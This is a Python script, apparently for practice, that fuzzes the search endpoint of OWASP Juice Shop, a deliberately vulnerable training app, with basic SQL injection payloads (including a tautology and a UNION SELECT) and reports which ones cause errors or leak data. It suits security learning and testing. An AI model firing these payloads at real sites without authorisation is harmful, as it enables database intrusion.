import requests
import urllib.parse

# --- Configuration ---
# This script is adapted for the OWASP Juice Shop API.
# The target endpoint is the product search functionality, which is known
# to be vulnerable to SQL Injection.
BASE_URL = "https://juice-shop.herokuapp.com"
SEARCH_ENDPOINT = f"{BASE_URL}/rest/products/search"

# A list of common, basic SQL Injection payloads to test with.
# The goal is to see if the server crashes or returns unexpected data.
sql_payloads = [
    "'",                  # A single quote to break a query
    "';--",               # A single quote to break a query and comment out the rest
    "' OR 1=1 --",        # A classic tautology to bypass authentication or logic
    "1' UNION SELECT 1,2,3,4,5,6,7,8,9--", # A basic UNION-based injection attempt
]

print("[*] Starting Advanced SQL Injection Fuzzing on Juice Shop...")
print(f"[*] Target Endpoint: {SEARCH_ENDPOINT}")
print("-" * 50)

# Loop through each payload and send a request
for payload in sql_payloads:
    # URL-encode the payload to ensure it's sent correctly in the query string
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{SEARCH_ENDPOINT}?q={encoded_payload}"
    
    print(f"[*] Testing with payload: {payload}")
    
    try:
        response = requests.get(full_url, timeout=10)
        
        # A 500 Internal Server Error is a strong sign of an unhandled exception,
        # very likely caused by our SQL injection payload.
        if response.status_code == 500:
            print(f"    [!] VULNERABLE! Payload caused a 500 Internal Server Error.")
        # If the API returns data for a payload like ' OR 1=1 --, it means the
        # injection was successful and returned more data than it should have.
        elif len(response.json().get("data", [])) > 0 and "1=1" in payload:
             print(f"    [!] VULNERABLE! Payload likely bypassed filters and returned all products.")
        else:
            print(f"    [-] Payload handled. Status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"    [E] Request with payload failed: {e}")

print("-" * 50)
print("[*] Fuzzing complete.")